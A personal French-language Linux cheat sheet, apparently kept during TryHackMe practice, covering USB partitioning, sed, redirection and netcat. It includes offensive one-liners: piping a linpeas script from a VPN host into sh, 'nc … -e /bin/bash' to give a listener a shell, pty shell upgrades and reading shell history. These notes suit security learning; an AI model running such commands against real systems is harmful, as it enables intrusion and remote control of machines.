N'oublie pas la commande man  

python -m http.server 8000 : Lancer un serveur python local

Pour récupérer le fichier : `curl [vpnhostIP]/linpeas.sh| sh` pour l'executer directement

wget : récupérer des fichiers via internet.

Formater cle usb :  
df : lister toute les partitions.  
sudo umount /dev/sd.....  
sudo mkfs.nfts /dev/sd.....

Quand ya un souci de capacité sur une clé usb :

**Étape 1. Supprimer toutes les partitions**

- Ouvrez un terminal et tapez **sudo su** .
- Tapez **fdisk -l** et notez la lettre de votre clé USB.
- Tapez **fdisk /dev/sdx** (en remplaçant x par votre lettre de lecteur).
- Tapez **d** pour procéder à la suppression d'une partition.
- Tapez **1** pour sélectionner la 1ère partition et appuyez sur Entrée.
- Tapez **d** pour procéder à la suppression d'une autre partition (fdisk devrait automatiquement sélectionner la deuxième partition).

**Étape 2. Créer une nouvelle partition**

- Tapez **n** pour créer une nouvelle partition.
- Tapez **p** pour rendre cette partition primaire et appuyez sur Entrée.
- Tapez **1** pour en faire la première partition, puis appuyez sur Entrée.
- Appuyez sur Entrée pour accepter le premier cylindre par défaut.
- Appuyez à nouveau sur Entrée pour accepter le dernier cylindre par défaut.
- Tapez **w** pour écrire les nouvelles informations de partition sur le disque USB.
- Tapez **mkfs.vfat -F 32 /dev/sdx1** (en remplaçant x par la lettre de votre clé USB).

adduser : créer un user

Pour démarrer le vpn de thm, faire, dans download, sudo openvpn name.ovpn &. Le & c'est pour le lancer en arrière plan. Puis faire entrer

Pour associer une adresse ip à un mot pour plus de rapidité, sudo nano /etc/host puis tu fais comme pour les autres, tu suis cette syntaxe :

[111.111.111.111](http://111.111.111.111 "http://111.111.111.111")            target

/dev/null : "trou noir" du terminal. en gros c'est pour supprimer des trucs.

Tu peux supp le résultat d'une commande (ne pas l'afficher): commande > /dev/null.

Tu peux aussi ne pas mettre d'entrée. par ex si j'ai un script qui affiche mon input, je fais ./[programme.sh](http://programme.sh "http://programme.sh") < /dev/null

Ou encore supprimer les erreurs : commande 2> /dev/null  
rappel :

En langage Unix, il existe trois flux standard :

- 0 : L'entrée standard (stdin) où les commandes lisent les données.
- 1 : La sortie standard (stdout) où les commandes affichent les résultats.
- 2 : Le flux d'erreur standard (stderr) où les commandes affichent les messages d'erreur.

cat ~/.*history | less : voir l'historique des commandes tapées

python -c 'import pty;pty.spawn("/bin/bash")' : Trois commandes (pas liées) à faire si tu est dans un shell réduit.

echo os.system('/bin/bash')  
/bin/sh -i

whoami : affiche l'utilisateur courant

|||
|---|---|
|Symbol / Operator|Description|
|&|Cet opérateur vous permet d'exécuter des commandes en arrière-plan de votre terminal.( à mettre après la commande)|
|&&|Cet opérateur vous permet de combiner plusieurs commandes dans une seule ligne de votre terminal.|
|>|Cet opérateur est un redirecteur - ce qui signifie que nous pouvons prendre la sortie d'une commande (comme l'utilisation de cat pour sortir un fichier) et la diriger ailleurs.|
|>>|Cet opérateur a la même fonction que l'opérateur >, mais il ajoute la sortie au lieu de la remplacer (ce qui signifie que rien n'est écrasé)..|

**Sed :** Editeur de données dans fichier (utile pour faire des trucs automatisés)

1. **Remplacement de texte :**

- Syntaxe de base : `sed 's/ancien_mot/nouveau_mot/' fichier`
- Exemple : `sed 's/apple/orange/' fichier.txt` remplace la première occurrence de "apple" par "orange" dans le fichier `fichier.txt`.

1. **Remplacement de toutes les occurrences :**

- Ajouter le modificateur `g` pour remplacer toutes les occurrences : `sed 's/ancien_mot/nouveau_mot/g' fichier`

1. **Utilisation de délimiteurs différents :**

- Vous pouvez utiliser des délimiteurs autres que `/` pour éviter d'avoir à échapper les caractères spéciaux. Par exemple : `sed 's|ancien_mot|nouveau_mot|' fichier`

1. **Suppression de lignes :**

- Pour supprimer une ligne qui contient un certain motif, utilisez : `sed '/motif/d' fichier`

1. **Impression de lignes spécifiques :**

- Utilisez `sed -n` pour supprimer l'impression par défaut, puis ajoutez une règle pour imprimer des lignes spécifiques. Par exemple : `sed -n '10,20p' fichier` imprime les lignes de 10 à 20.

1. **Ajout de texte à la fin d'une ligne :**

- `sed 's/$/ texte_a_ajouter/' fichier` ajoute "texte_a_ajouter" à la fin de chaque ligne.

1. **Utilisation de scripts avec **`**sed**`** :**

- Vous pouvez également utiliser des scripts `sed` contenus dans des fichiers externes. Par exemple : `sed -f script.sed fichier`

1. **Modification en place du fichier :**

- Ajouter l'option `-i` pour modifier le fichier en place. Par exemple : `sed -i 's/ancien_mot/nouveau_mot/' fichier`

1. **Utilisation de expressions régulières :**

- `sed` supporte les expressions régulières étendues (ERE). Par exemple : `sed -E 's/[0-9]+/NUM/g' fichier` remplace tous les nombres par "NUM

**Netcat :** établir connexion dans shell entre machine.

```
-c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
```

Attendre une connexion :

- nc -lvp portnumber

Se connecter :

- nc address portnumber

Executer un fichier quand on se connecte :

- nc address portnumber -e filename (on peut mettre /bin/bash pour que le listener puisse executer un shell sur ta session)

Charger un fichier text vers un fichier text distant :

- Dans la sessions listener : nc -lvp portnumber > filetarget.txt
- Dans la session connector : nc address portnumber < contentfile.txt
- Le contenu du contentfile.txt ira dans filetarget.txt

**Opérations mathématiques dans un shell**
- `printf "%x\n" $((0x7fffffffda70 - 0x24))`
- `printf "%d\n" 0x1f  `
- `printf "%020x" 123` Converti la valeur 123 en hex sur 20 bit
- `printf "%d\n" 0xFF

Programmer une tâche ponctuelle
`at now + 20 minutes
`> firefox` lance firefox dans 20 minutes


**Inodes** ^9a4a17
